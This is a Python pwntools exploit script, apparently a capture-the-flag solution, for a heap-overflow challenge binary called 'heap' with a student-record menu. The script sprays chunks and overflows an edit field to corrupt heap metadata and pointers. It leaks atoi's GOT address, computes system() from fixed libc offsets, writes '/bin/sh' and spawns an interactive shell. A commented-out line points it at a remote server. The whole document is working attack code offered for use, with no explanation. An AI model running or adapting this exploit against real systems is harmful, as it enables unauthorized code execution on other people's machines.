#!/usr/bin/env python

from pwn import *

#context.log_level = 'debug'

def add(lName, name, lSname, sname, tutor='no'):
	p.sendlineafter("option:", '1')
	p.sendlineafter("name", str(lName))
	p.sendlineafter("name", name)
	p.sendlineafter("schoolname", str(lSname))
	p.sendlineafter("school name", sname)
	p.sendlineafter(")", tutor)

def remove(ID):
	p.sendlineafter("option:", '2')
	p.sendlineafter("delete", str(ID))

def edit(ID, length, context, flag):
	p.sendlineafter("option:", '3')
	p.sendlineafter("edit", str(ID))
	if flag == 0:
		p.sendlineafter("option:", '1')
		p.sendlineafter("name", str(length))
		p.sendlineafter("name", context)
	else:
		p.sendlineafter("option:", '2')
		p.sendlineafter("schoolname", str(length))
		p.sendlineafter("schoolname", context)

def show(ID):
	p.sendlineafter("option:", '4')
	p.sendlineafter("intro", str(ID))

#p = process("./heap", env={"LD_PRELOAD":"/home/al3x/libc.so.6"})
#p = remote('106.75.8.58', 23238)
p = process("./heap")
for i in range(120):
	add(0x29, 'aaaa', 0x29, 'bbbb')

atoi_got = 0x602FE8
bss_addr = 0x60F000
add(0x29, 'aaaa', 0x29, 'bbbb')	# heap 120
add(0x29, 'aaaa', 0x29, 'bbbb')	# heap 121
add(0x29, 'aaaa', 0x29, 'bbbb')	# heap 122
add(0x29, 'aaaa', 0x29, 'bbbb')	# heap 123
add(0x29, 'aaaa', 0x29, 'bbbb')	# heap 124

payload = 'a'*0x30   			#padding
payload += 'a'*8 + p64(0x41)  	#prev_size & size
payload += p64(0x79) 			#id
payload += p64(atoi_got)		#name_chunck_ptr
payload += '\x57\xC0'			#cookie_off
edit(120, 0x55, payload, 1)

show(121)
p.recvuntil("name is ")
atoi_addr = u64(p.recv(6).ljust(8, '\x00'))
system_addr = atoi_addr - 0x36E80 + 0x45390

payload = 'a'*0x30
payload += 'a'*8 + p64(0x41)
payload += p64(0x7a)
payload += p64(bss_addr)
payload +='\x3f'
edit(121, 0x55, payload, 1)
edit(122, 0x10, '/bin/sh', 0)

payload = 'a'*0x30
payload += 'a'*8 + p64(0x41) 
payload += p64(0x7c)
payload += p64(bss_addr)
payload += p64(0x3f)
payload += p64(system_addr)
payload += p64(bss_addr)
payload += '\x3f'
edit(123, 0x6d, payload, 1)
#raw_input()
show(124)

p.interactive()
